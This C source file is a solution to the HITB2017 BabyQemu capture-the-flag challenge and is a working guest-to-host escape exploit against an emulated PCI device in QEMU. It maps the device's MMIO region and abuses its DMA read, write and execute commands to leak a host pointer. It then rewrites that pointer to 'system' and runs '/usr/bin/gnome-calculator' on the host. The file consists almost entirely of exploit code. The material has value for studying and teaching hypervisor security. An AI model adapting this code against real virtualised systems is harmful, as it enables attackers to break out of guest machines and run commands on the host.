/*

Solution for HITB2017 BabyQemu Challenge
gcc -o babyqemu babyqemu.c -static
./babyqemu /sys/devices/pci0000\:00/0000\:00\:04.0/resource0

*/

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/io.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>


uint64_t virt2phys(void *addr) {
    uint64_t pfn = 0;
    uint64_t offset = ((uint64_t)addr / getpagesize()) * sizeof(uint64_t);

    int fd = open("/proc/self/pagemap", O_RDONLY);

    lseek(fd, offset, SEEK_SET);
    read(fd, &pfn, sizeof(uint64_t));

    pfn &= 0x7fffffffffffff;

    printf("phys address: %lx\n\n", ((pfn << 12) | ((uint64_t)addr & 0xfff)));

    return ((pfn << 12) | ((uint64_t)addr & 0xfff));
}

void *cpu_write(void *addr, void *mmio) {
    *(uint64_t *)(mmio + 0x80) = 0x41000;
    *(uint64_t *)(mmio + 0x88) = virt2phys(addr);
    *(uint64_t *)(mmio + 0x90) = 0x8;
    *(uint64_t *)(mmio + 0x98) = 0x3;

    sleep(2);
}

void *cpu_read(void *addr, void *mmio, uint64_t dst) {
    *(uint64_t *)(mmio + 0x80) = virt2phys(addr);
    *(uint64_t *)(mmio + 0x88) = dst;
    *(uint64_t *)(mmio + 0x90) = 0x8;
    *(uint64_t *)(mmio + 0x98) = 0x1;

    sleep(2);
}

void *cpu_execute(void *addr, void *mmio) {
    *(uint64_t *)(mmio + 0x80) = 0x40000;
    *(uint64_t *)(mmio + 0x98) = 0x7;

    sleep(2);
}

int main(int argc, char *argv[]) {

    int fd = open(argv[1], O_RDWR|O_SYNC);
    if (fd < 0) {
        exit(1);
    }

    void *mmio = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio == MAP_FAILED) {
        exit(1);
    }

    void *temp = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
    if (temp == MAP_FAILED) {
        exit(1);
    }

    memset(temp, 0xaa, 0x1000);
    printf("temp: %lx\n\n", *(uint64_t *)temp);

    cpu_write(temp, mmio);

    sleep(2);
    printf("temp after: %lx\n\n", *(uint64_t *)temp);
    *(uint64_t *)temp += 0x2aaaa22174c0;
    printf("temp adjusted to system: %lx\n\n", *(uint64_t *)temp);
    
    cpu_read(temp, mmio, 0x41000);
    sleep(2);

    *(uint64_t *)temp = 0x6E69622F7273752F;
    cpu_read(temp, mmio, 0x40000);
 
    *(uint64_t *)temp = 0x632D656D6F6E672F;
    cpu_read(temp, mmio, (0x40000 + 0x8));
    
    *(uint64_t *)temp = 0x6F74616C75636C61;
    cpu_read(temp, mmio, (0x40000 + 0x10));
    
    *(uint64_t *)temp = 0x72;
    cpu_read(temp, mmio, (0x40000 + 0x18));

    cpu_execute(temp, mmio);
    

    exit(0);
}
